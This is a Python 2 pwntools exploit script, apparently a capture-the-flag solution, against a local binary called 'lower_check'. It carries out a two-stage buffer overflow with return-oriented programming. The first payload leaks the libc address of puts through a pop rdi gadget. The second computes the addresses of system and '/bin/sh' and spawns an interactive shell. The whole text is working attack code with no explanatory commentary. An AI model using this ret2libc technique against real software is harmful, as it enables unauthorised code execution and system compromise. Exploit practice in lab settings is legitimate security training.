from pwn import *
elf = ELF("./lower_check")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def un64(data):
    return int(data[::-1].encode("hex"),16)

def main():
    r           = elf.process()
    pop_rdi     = 0x00000000004007d3
    puts_plt    = 0x0000000000400550
    puts_libc   = 0x000000601018
    main        = 0x00000000004006a2

    p = ""
    p += "\x00"
    p += "A"*159
    p += "B"*8
    p += p64(pop_rdi)
    p += p64(puts_libc)
    p += p64(puts_plt)
    p += p64(main)

    r.sendline(p)
    r.recvuntil("[+] The Result : True\n")
    response = un64(r.recvline().strip())
    print "[!] response      : ",hex(response)

    offset_puts = response

    libc_base  = offset_puts - libc.symbols['puts']
    libc_system= libc_base + libc.symbols['system']
    libc_bin_sh= libc_base + libc.search("/bin/sh").next()

    print "[?] _libc_base_   : ", format(hex(libc_base))
    print "[?] _libc_system_ : ", format(hex(libc_system))
    print "[?] _libc_bin_sh_ : ", format(hex(libc_bin_sh))

    p2 = ""
    p2 += "\x00"
    p2 += "A" * 159
    p2 += "X" * 8
    p2 += p64(pop_rdi)
    p2 += p64(libc_bin_sh)
    p2 += p64(libc_system)
    p2 += "AAAAAAAA"

    r.sendline(p2)
    r.interactive()

if __name__ == '__main__':
    main()
